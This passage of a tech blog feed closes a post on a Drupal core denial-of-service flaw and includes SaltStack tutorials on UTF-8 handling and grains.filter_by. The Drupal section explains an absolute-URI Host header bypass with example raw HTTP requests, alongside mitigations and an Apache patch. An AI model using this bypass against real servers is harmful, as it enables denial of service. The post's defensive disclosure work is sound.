    &lt;span class=&quot;nv&quot;&gt;$current&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;array_walk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$rev_server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;prepare_name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$current&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$work_server&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;array_reverse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$rev_server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// --end new&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;// now the loop is a simple foreach name on first array&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$work_server&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;implode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;array_slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And this fixed the performance issue (when &lt;code&gt;file_exists&lt;/code&gt; is fast). But preventing bad hostnames as we have in the final fix is a better fix, more radical, no good reason to manage several thousand of subdomains.&lt;/p&gt;

&lt;p&gt;Is this a real DOS issue? Well, on real life production servers, with a lot of memory and very fast CPUs we've made exploits which usually made any (unique) request run in this loop for more than &lt;strong&gt;2 minutes&lt;/strong&gt;. So with an attacker running parallel requests or reaching some cheaper hosts, this could really become a problem.&lt;/p&gt;

&lt;h2&gt;Protect your website&lt;/h2&gt;

&lt;p&gt;Things that &lt;strong&gt;DO NOT&lt;/strong&gt; protect you, &lt;strong&gt;theses things will not protect your Drupal website from being attacked&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Not having a &lt;strong&gt;multisite drupal&lt;/strong&gt;, this happens on the multisite check and you cannot suspend it on D5, D6 and D7 (opt-in for D8, at last), you &lt;strong&gt;always&lt;/strong&gt; have this &lt;code&gt;conf_path()&lt;/code&gt; running, on every request, and you cannot do anything before the settings are loaded.&lt;/li&gt;
&lt;li&gt;Not having drupal on the &lt;strong&gt;Default Virtualhost&lt;/strong&gt;, the &lt;strong&gt;absolute-URI&lt;/strong&gt; trick will hit you, see last part.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Old Drupal&lt;/strong&gt;, this issue is present from a very very long time, also present in Drupal5 for example.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Varnish, Nginx, Apache&lt;/strong&gt; (and maybe others): no default protection.&lt;/li&gt;
&lt;li&gt;Using the &lt;code&gt;www/sites.php&lt;/code&gt; hostname location mapping file, as you will not have the bad hostnames there and you have no way in drupal to reject undefined names.&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;Things &lt;strong&gt;THAT MAY WORK&lt;/strong&gt; to protect yourself (untested):&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;using &lt;strong&gt;mod_security&lt;/strong&gt; or some other security tool checking for some strange Host headers, but you should check the behavior of theses tools with the absolute-URI trick (see last part).&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;Things &lt;strong&gt;THAT DO WORK&lt;/strong&gt; to protect yourself (choose one):&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Upgrade &lt;a href=&quot;https://www.drupal.org/drupal-6.32-release-notes&quot;&gt;D6&lt;/a&gt; or [D7][DRUPAL_7] to the last versions &lt;em&gt;OR&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Apply the &lt;a href=&quot;https://www.drupal.org/files/issues/sec-D7-conf-path-dos-105258-23.patch&quot;&gt;DOS patch&lt;/a&gt; &lt;em&gt;OR&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;use a default catch-all non-drupal Virtualhost &lt;strong&gt;and&lt;/strong&gt; &lt;a href=&quot;https://issues.apache.org/bugzilla/show_bug.cgi?id=56718&quot;&gt;patch Apache&lt;/a&gt; (see at the end) &lt;em&gt;OR&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Add a &lt;strong&gt;mod_rewrite&lt;/strong&gt; &lt;em&gt;Hostname check&lt;/em&gt; :&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;The Mod_rewrite Apache module will receive the same &lt;strong&gt;HOSTNAME&lt;/strong&gt; as PHP in the &lt;strong&gt;HTTP_HOST&lt;/strong&gt; variable. If the Absolute-URI trick is used mod_rewrite could detect bad hostname and reject the request. Let's say you have one or two valid DNS for your Drupal websites (here &lt;code&gt;foo.example.com&lt;/code&gt; and &lt;code&gt;bar.example.com&lt;/code&gt;), then check Apache made the right job and reached your Drupal with theses valid names:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Reject with a 403 any hostname wich is not in our list of supported domains&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;RewriteCond&lt;/span&gt; %{HTTP_HOST} !^foo\.example\.com$
    &lt;span class=&quot;nb&quot;&gt;RewriteCond&lt;/span&gt; %{HTTP_HOST} !^bar\.example\.com$
    &lt;span class=&quot;nb&quot;&gt;RewriteRule&lt;/span&gt; .* - [F,L]&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;The absolute-URI trick?&lt;/h2&gt;

&lt;p&gt;So, as I said before the default Virtualhost method does not protect you, that's sad because it's usually a good practice, you add a default Virtualhost with default simple pages (like an &quot;It Works&quot; page) and anyone doing bad things with HOST headers would end there.&lt;/p&gt;

&lt;p&gt;But this can be bypassed with both Apache and Nginx by using the absolute-URI trick describe at the end of the &lt;a href=&quot;http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html&quot;&gt;Practical Host Header attacks paper&lt;/a&gt; that I linked before.&lt;/p&gt;

&lt;p&gt;The trick is to use an absolute URI in the first part of the HTTP query. Instead of the classical HTTP 1.1 request :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;GET /page/foo?z=42 HTTP/1.1
Host: www.example.com
(other headers)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You do:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;GET http://www.example.com/page/foo?z=42 HTTP/1.1
Host: something.else
(other headers)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And the RFC 2616 says this request should be managed by the &lt;code&gt;www.example.com&lt;/code&gt; virtualhost, that's OK. And it also states that the Host Header should then be &lt;strong&gt;ignored&lt;/strong&gt;. Cool. But in both Apache and Nginx this does not means the used Host headers will not be sent to the final application (here PHP).&lt;/p&gt;

&lt;p&gt;At the end Drupal receive the Host header (here &lt;code&gt;something.else&lt;/code&gt;). I think this is an issue on the HTTP server side. This header should be overwritten and should look like &lt;code&gt;www.example.com&lt;/code&gt;. What's worse is that classical bad characters that are usually detected in the Host headers are not checked in Apache when you use the Abolute-URI trick. On the drupal side we have the regex cleanup on the Host header, that's a very good thing (&lt;a href=&quot;http://en.wikipedia.org/wiki/Defense_in_depth_%28computing%29&quot;&gt;defense in depth&lt;/a&gt; applied). On the drupal side using the absolute-URI trick will produce a 404 page, the URL does not match any known Drupal path, but this 404 is not a problem for the DOS attack which occurs on the settings file search, very early.&lt;/p&gt;

&lt;p&gt;If you think this is an Apache issue please vote for this &lt;a href=&quot;https://issues.apache.org/bugzilla/show_bug.cgi?id=56718&quot;&gt;Apache patch&lt;/a&gt; on the httpd bugtracker, which overwrite the HTTP_HOST with the absolute-uri host :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;--- server/protocol.c   2014-03-10 14:04:03.000000000 +0100
+++ server/protocol.c.new   2014-06-05 23:41:38.233573966 +0200
@@ -1063,6 +1063,21 @@

     apr_brigade_destroy(tmp_bb);

+    /*
+    * rfc2616: If Request-URI is an absoluteURI, the host is part of the
+    * Request-URI. Any Host header field value in the request MUST be
+    * ignored.
+    * We are currently ignoring it, but the Host headers are still present
+    * and may get use by naive programs as the one used for vhost choice
+    * or like a valid hostname. So enforce the 'ignore' behavior by
+    * overwritting any present Host header.
+    * Note that this is made just before the fixHostname(r) call, so this
+    * Host header entry is still not as safe as the hostname.
+    */
+    if (r-&amp;gt;hostname &amp;amp;&amp;amp; apr_table_get(r-&amp;gt;headers_in, &quot;Host&quot;)) {
+        apr_table_set(r-&amp;gt;headers_in, &quot;Host&quot;, r-&amp;gt;hostname);
+    }
+
     /* update what we think the virtual host is based on the headers we've
      * now read. may update status.
      */
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With this patch applied the only way to get a strange Hostname targeted to your Drupal would be having the Drupal Apache Virtualhost used as default Virtualhost, something usually quite easy to fix.&lt;/p&gt;

&lt;p&gt;Nginx may also need a fix one day.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://twitter.com/regilero&quot;&gt;Stay tuned on twitter, @regilero&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/makinacorpus&quot;&gt;@makinacorpus&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
				<published>2014-09-19 00:00:00 +0200</published>
				<link>http://regilero.github.io/security/english/2014/09/19/drupal-details_ofdrupal_sa_core_2014_003_dos/</link>
			</item>
		
			<item>
				<title>SaltStack, Use more than ascii7 on sls files with yaml_utf8 option</title>
				<description>&lt;p&gt;&lt;strong&gt;Warning&lt;/strong&gt;: &lt;em&gt;this option is only available on the &lt;code&gt;2014-01&lt;/code&gt; branch or the &lt;code&gt;develop&lt;/code&gt; branch, it's not yet available on the 0.17 releases branch.&lt;/em&gt;&lt;/p&gt;

&lt;h2&gt;Special characters?&lt;/h2&gt;

&lt;p&gt;DevOps, developpers and sysadmins are usually nice people. They usually knows that most of the computer's tools they use are made by US people and that using nasty things such as spaces or, nastier, special characters like &lt;code&gt;é&lt;/code&gt; or &lt;code&gt;한&lt;/code&gt; may break their tools.&lt;/p&gt;

&lt;p&gt;This is why most databases names will ends up as nice ascii7 names with spaces replaced by underscores, and most of the filesystem files follows the same rules.&lt;/p&gt;

&lt;p&gt;But we are not anymore in the 60s. Every filesystem allows for utf-8 in file names, even the databases -- on a next post we'll show how salt mysql module has been improved to allow almost any character combination --. So salt-stack should support this fact.&lt;/p&gt;

&lt;p&gt;But you may wonder why your salt-stack installation should support 'strange' characters?
You should take care of that because you usually provide states that you have tested with very simple hello-world level tests. And as a nice and polite computer guy, you did not add any nasty characters in your tests.
And your sls files may contain jinja variables, which may be used with data coming from external sources. You may even have a full PaaS or SaaS system running. And sooner or later you will have a user that will feed an input field with something like a company name. This company name will contain spaces and maybe Korean characters... This user entry will maybe end up in a configuration file's name, in a database's name, in a managed file's content. Chances are great that some of &lt;strong&gt;theses strange characters will end up somewhere in your salt's sls files&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;The &lt;a href=&quot;http://docs.saltstack.com/ref/configuration/master.html#yaml-utf8&quot;&gt;new yaml_utf8 option&lt;/a&gt; should be enabled on your salt-stack installation to manage these cases. This is not activated by default, it's a new option, and is waiting for some positive and negative feedbacks (use &lt;a href=&quot;https://github.com/saltstack/salt/pull/9053&quot;&gt;this github pull request&lt;/a&gt; for example, or make new issues). So feel free to experiment.&lt;/p&gt;

&lt;p&gt;Let's see why you need it and what this option is really doing.&lt;/p&gt;

&lt;h2&gt;See it in action&lt;/h2&gt;

&lt;p&gt;What happens if my yaml sls file contains some utf-8 characters? Well, bad things :-).&lt;/p&gt;

&lt;p&gt;Let's try it. We'll make a very simple state, doing some echo, and we'll do that in a &lt;code&gt;testchar.sls&lt;/code&gt; file on the salt tree root.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# -*- coding: utf-8 -*-
test-characters:
  cmd.run:
    - name: echo &quot;¿Me pones un café, por favor?&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You can see the python utf-8 markers on the top of the sls file, this makes sure that the characters in this sls file are valid utf-8 characters. Two characters here are not in ascii7 &lt;code&gt;¿&lt;/code&gt; and &lt;code&gt;é&lt;/code&gt;. Let's now run this single state:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#$ salt-call state.sls testchar
[ERROR   ] An un-handled exception was caught by salt's global exception handler:
UnicodeEncodeError: 'ascii' codec can't encode character u'\xbf' in position 6: ordinal not in range(128)
Traceback (most recent call last):
  File &quot;/usr/local/bin/salt-call&quot;, line 44, in &amp;lt;module&amp;gt;
    sys.exit(salt.scripts.salt_call())
  File &quot;/usr/local/salt/scripts.py&quot;, line 82, in salt_call
    client.run()
  File &quot;/usr/local/salt/cli/__init__.py&quot;, line 314, in run
    caller.run()
  File &quot;/usr/local/salt/cli/caller.py&quot;, line 142, in run
    ret = self.call()
  File &quot;/usr/local/salt/cli/caller.py&quot;, line 80, in call
    ret['return'] = func(*args, **kwargs)
  File &quot;/usr/local/salt/modules/state.py&quot;, line 383, in sls
    ret = st_.state.call_high(high_)
  File &quot;/usr/local/salt/state.py&quot;, line 1701, in call_high
    chunks = self.compile_high_data(high)
  File &quot;/usr/local/salt/state.py&quot;, line 976, in compile_high_data
    chunks = self.order_chunks(chunks)
  File &quot;/usr/local/salt/state.py&quot;, line 920, in order_chunks
    chunks.sort(key=lambda k: (k['order'], '{0[state]}{0[name]}{0[fun]}'.format(k)))
  File &quot;/usr/local/salt/state.py&quot;, line 920, in &amp;lt;lambda&amp;gt;
    chunks.sort(key=lambda k: (k['order'], '{0[state]}{0[name]}{0[fun]}'.format(k)))
UnicodeEncodeError: 'ascii' codec can't encode character u'\xbf' in position 6: ordinal not in range(128)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ouch.&lt;/p&gt;

&lt;p&gt;Now let's find the &lt;code&gt;yaml_utf8&lt;/code&gt; option in your master salt configuration file, for me it was in &lt;code&gt;/etc/salt/master.d/00_global.conf&lt;/code&gt;, and set it to True. Then restart the master and test again:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#$ service salt-master restart
salt-master stop/waiting
salt-master start/running, process 5471
#$ salt-call state.sls testchar
local:
----------
          ID: test-characters
    Function: cmd.run
        Name: echo &quot;¿Me pones un café, por favor?&quot;
      Result: True
     Comment: Command &quot;echo &quot;¿Me pones un café, por favor?&quot;&quot; run
     Changes:   
              ----------
              pid:
                  5053
              retcode:
                  0
              stderr:

              stdout:
                  ¿Me pones un café, por favor?

Summary
------------
Succeeded: 1
Failed:    0
------------
Total:     1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Great.&lt;/p&gt;

&lt;p&gt;Note that the main problem here, in the first example, was that special characters were used on the state &lt;strong&gt;name&lt;/strong&gt;. But it could also happen with harmless attributes. Let's try with a &lt;strong&gt;text&lt;/strong&gt; attribute, and without the &lt;code&gt;yaml_utf8&lt;/code&gt; option set:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# -*- coding: utf-8 -*-
test-characters1:
  file.touch:
    - name: /tmp/foobar
test-characters2:
  file.append:
    - name: /tmp/foobar
    - text: &quot;¿Me pones un café, por favor?&quot;
    - require:
      - file: test-characters1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It will also fail:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#$ salt-call state.sls testch
local:
----------
          ID: test-characters1
    Function: file.touch
        Name: /tmp/foobar
      Result: True
     Comment: Updated times on file /tmp/foobar
     Changes:   
----------
          ID: test-characters2
    Function: file.append
        Name: /tmp/foobar
      Result: False
     Comment: An exception occurred in this state: Traceback (most recent call last):
                File &quot;/usr/local/salt/state.py&quot;, line 1370, in call
                  **cdata['kwargs'])
                File &quot;/usr/local/salt/states/file.py&quot;, line 2519, in append
                  name, salt.utils.build_whitespace_split_regex(chunk)):
                File &quot;/usr/local/salt/utils/__init__.py&quot;, line 772, in     build_whitespace_split_regex
                  parts = [re.escape(s) for s in __build_parts(line)]
                File &quot;/usr/local/salt/utils/__init__.py&quot;, line 761, in     __build_parts
                  lexer = shlex.shlex(text)
                File &quot;/usr/lib/python2.7/shlex.py&quot;, line 25, in __init__
                  instream = StringIO(instream)
              UnicodeEncodeError: 'ascii' codec can't encode character u'\xbf' in position 0: ordinal not in range(128)
     Changes:   

Summary
------------
Succeeded: 1
Failed:    1
------------
Total:     2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;But here, at least, you have a catched exception.&lt;/p&gt;

&lt;p&gt;Obviously, after using the &lt;code&gt;yaml_utf8&lt;/code&gt; option this state will work.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;local:
----------
          ID: test-characters1
    Function: file.touch
        Name: /tmp/foobar
      Result: True
     Comment: Updated times on file /tmp/foobar
     Changes:   
----------
          ID: test-characters2
    Function: file.append
        Name: /tmp/foobar
      Result: True
     Comment: Appended 1 lines
     Changes:   
              ----------
              diff:
                  --- 
                  +++ 
                  @@ -0,0 +1 @@
                  +¿Me pones un café, por favor?
Summary
------------
Succeeded: 2
Failed:    0
------------
Total:     2
&lt;/code&gt;&lt;/pre&gt;

&lt;h2&gt;What happened exactly?&lt;/h2&gt;

&lt;p&gt;If you want to understand this better I'll give some details. You do not need to understand the details, but it could be useful, especially if you are american (or part of the subset of humanity using pounds, miles and ascii7).&lt;/p&gt;

&lt;p&gt;The error was there:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;  File &quot;/usr/local/salt/state.py&quot;, line 920, in &amp;lt;lambda&amp;gt;
    chunks.sort(key=lambda k: (k['order'], '{0[state]}{0[name]}{0[fun]}'.format(k)))
UnicodeEncodeError: 'ascii' codec can't encode character u'\xbf' in position 6: ordinal not in range(128)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Salt is ordering the states and the states' name are used to do the sorting. Here we have special characters on these names and the sort method emits an uncatched exception.&lt;/p&gt;

&lt;p&gt;A fix would be replacing &lt;code&gt;'{0[state]}{0[name]}{0[fun]}'&lt;/code&gt; with &lt;code&gt;u'{0[state]}{0[name]}{0[fun]}'&lt;/code&gt;. But you would need this sort of fix in a thousand places. You would have to fix pretty much every string in salt :-(&lt;/p&gt;

&lt;p&gt;By default, with python 2.x, there are two types of string objects:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;str : the default string object, allow utf-8 encoded strings (a byte string)&lt;/li&gt;
&lt;li&gt;unicode : an unicode string&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;An example is worth a thousand words:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#$ python
&amp;gt;&amp;gt;&amp;gt; foo=&quot;foo&quot;
&amp;gt;&amp;gt;&amp;gt; foo
'foo'
&amp;gt;&amp;gt;&amp;gt; type(foo)
&amp;lt;type 'str'&amp;gt;
&amp;gt;&amp;gt;&amp;gt; bar=&quot;準&quot;
&amp;gt;&amp;gt;&amp;gt; bar
'\xe6\xba\x96'
&amp;gt;&amp;gt;&amp;gt; type(bar)
&amp;lt;type 'str'&amp;gt;
&amp;gt;&amp;gt;&amp;gt; baz=u&quot;準&quot;
&amp;gt;&amp;gt;&amp;gt; baz
u'\u6e96'
&amp;gt;&amp;gt;&amp;gt; type(baz)
&amp;lt;type 'unicode'&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So the special character &lt;code&gt;準&lt;/code&gt; is &lt;code&gt;\xe6\xba\x96&lt;/code&gt; in utf-8 encoding and &lt;code&gt;\u6e96&lt;/code&gt; in unicode encoding. Unicode and utf-8 are not the same things. And by default string objects are utf-8 encoded strings.&lt;/p&gt;

&lt;p&gt;The funny thing is that this is not the case in python 3.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#$ /usr/bin/python3.2
&amp;gt;&amp;gt;&amp;gt; foo=&quot;foo&quot;
&amp;gt;&amp;gt;&amp;gt; foo
'foo'
&amp;gt;&amp;gt;&amp;gt; type(foo)
&amp;lt;class 'str'&amp;gt;
&amp;gt;&amp;gt;&amp;gt; bar=&quot;準&quot;
&amp;gt;&amp;gt;&amp;gt; bar
'準'
&amp;gt;&amp;gt;&amp;gt; type(bar)
&amp;lt;class 'str'&amp;gt;
&amp;gt;&amp;gt;&amp;gt; baz=bar.encode('utf-8')
&amp;gt;&amp;gt;&amp;gt; baz
b'\xe6\xba\x96'
&amp;gt;&amp;gt;&amp;gt; type(baz)
&amp;lt;class 'bytes'&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In python3 the default string class will be unicode (as if you had prefixed all your python2 string with &lt;code&gt;u&lt;/code&gt;), and the old python default str type will be the byte string class. You will need to prefix with &lt;code&gt;b&lt;/code&gt; to get that sort of utf-8 encoded strings.&lt;/p&gt;

&lt;p&gt;You can find a very detailled explanation on &lt;a href=&quot;http://docs.python.org/3.3/howto/unicode.html&quot;&gt;python's unicode documentation&lt;/a&gt; and on &lt;a href=&quot;http://wolfprojects.altervista.org/talks/unicode-and-python-3/&quot;&gt;this slide explaining the difference of string encoding in python2 and 3&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Talking about &lt;strong&gt;&lt;a href=&quot;http://www.saltstack.com/&quot;&gt;Salt-stack&lt;/a&gt;&lt;/strong&gt; we are working in a python2 world. And in pretty every string usage inside salt-stack default strings are used, so byte strings, allowing utf-8 encoding but not unicode. This should allow every special character, if they are well transformed to an utf-8 encoded string. If our special string is managed in this form:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;'\xc2\xbfMe pones un caf\xc3\xa9, por favor?'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Everything should be fine.&lt;/p&gt;

&lt;p&gt;The problem comes from the sls yaml transcription. Salt works with low states, highstates, etc. This is generated from the sls files with a yaml transcription. And this task is made by a yaml library.&lt;/p&gt;

&lt;p&gt;This &lt;strong&gt;yaml parser library&lt;/strong&gt; is python3-ready, and the result of the yaml parsing is always &lt;strong&gt;unicode strings&lt;/strong&gt; if special characters are encountered, not str default strings. So as soon as you have a special character in the sls salt receive unicode u'foo' strings while everything is made to handle utf-8 encoded strings. This yaml_utf8 option is there to ensure that after the yaml load is made, every unicode string is decoded to utf-8, you can see it in the code &lt;a href=&quot;https://github.com/saltstack/salt/blob/2014.1/salt/renderers/yaml.py#L70-92&quot;&gt;right here&lt;/a&gt;.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://twitter.com/regilero&quot;&gt;Stay tuned on twitter, @regilero&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/makinacorpus&quot;&gt;@makinacorpus&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
				<published>2014-02-05 00:00:00 +0100</published>
				<link>http://regilero.github.io/saltstack/english/2014/02/05/saltstack-use-more-than-ascii7-on-sls-files-with-yaml_utf8-option/</link>
			</item>
		
			<item>
				<title>SaltStack, Merge dictionaries of settings with grains.filter_by</title>
				<description>&lt;p&gt;If you read some formulas you may have noticed a nice way of managing settings. The &lt;a href=&quot;http://docs.saltstack.com/ref/modules/all/salt.modules.grains.html#salt.modules.grains.filter_by&quot;&gt;&lt;code&gt;grains.filter_by&lt;/code&gt;&lt;/a&gt; function. Values used in salt states are usually dynamic, coming from grains, from the pillar, from variations depending on the host environment. When you have a big number of variables using only the default jinja tools is sometimes frustrating. This is a must-know feature.&lt;/p&gt;

&lt;p&gt;There's a nice example in &lt;a href=&quot;https://github.com/saltstack-formulas/apache-formula/blob/master/apache/map.jinja&quot;&gt;the Apache formula map.jinja file&lt;/a&gt;, which may evolve, so let's show what it looks like:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;{% set apache = salt['grains.filter_by']({
    'Debian': {
        'server': 'apache2',
        'service': 'apache2',

        'mod_wsgi': 'libapache2-mod-wsgi',

        'vhostdir': '/etc/apache2/sites-available',
        'confdir': '/etc/apache2/conf.d',
        'logdir': '/var/log/apache2',
        'wwwdir': '/srv',
    },
    'RedHat': {
        'server': 'httpd',
        'service': 'httpd',

        'mod_wsgi': 'mod_wsgi',

        'vhostdir': '/etc/httpd/conf.d',
        'confdir': '/etc/httpd/conf.d',
        'logdir': '/var/log/httpd',
        'wwwdir': '/var/www',
    },
}, merge=salt['pillar.get']('apache:lookup')) %}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This sets an &lt;code&gt;apache&lt;/code&gt; jinja variable, a dictionary containing &lt;code&gt;server&lt;/code&gt;, &lt;code&gt;service&lt;/code&gt;,&lt;code&gt;confdir&lt;/code&gt; or &lt;code&gt;wwwdir&lt;/code&gt; keys (and some more).&lt;/p&gt;

&lt;p&gt;The main idea of &lt;code&gt;salt['grains.filter_by']&lt;/code&gt; is to filter a settings dictionary based on a grain: &lt;strong&gt;os_family&lt;/strong&gt; (here the value may be 'Redhat' or 'Debian').&lt;/p&gt;

&lt;p&gt;Usage of this &lt;code&gt;map.jinja&lt;/code&gt; file can be &lt;a href=&quot;https://github.com/saltstack-formulas/apache-formula/blob/master/apache/init.sls&quot;&gt;seen on the init.sls&lt;/a&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;{% from &quot;apache/map.jinja&quot; import apache with context %}

apache:
  pkg:
    - installed
    - name: {{ apache.server }}
(...)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now if you have a pretty recent version (&gt; 0.17.2) of Salt-stack this &lt;a href=&quot;http://docs.saltstack.com/ref/modules/all/salt.modules.grains.html#salt.modules.grains.filter_by&quot;&gt;&lt;code&gt;filter_by&lt;/code&gt;&lt;/a&gt; function has some new very interesting features.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;salt.modules.grains.filter_by(lookup_dict, grain='os_family', merge=None, default='default')
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;the &lt;strong&gt;lookup dict&lt;/strong&gt; is your dictionary of settings where you want a filter to be applied, so at the end you will obtain a subtree of this dictionary.&lt;/li&gt;
&lt;li&gt;the &lt;strong&gt;grain&lt;/strong&gt; is by default the &lt;em&gt;os_family&lt;/em&gt; grain, but you can use any defined grain key (&lt;code&gt;salt-call grains.items&lt;/code&gt; to see them).&lt;/li&gt;
&lt;li&gt;the &lt;strong&gt;merge&lt;/strong&gt; argument lets you merge another dictionary on top of the end result, this is very useful, as seen on the apache's formula, to retrieve pillar data overriding the default settings dictionary.&lt;/li&gt;
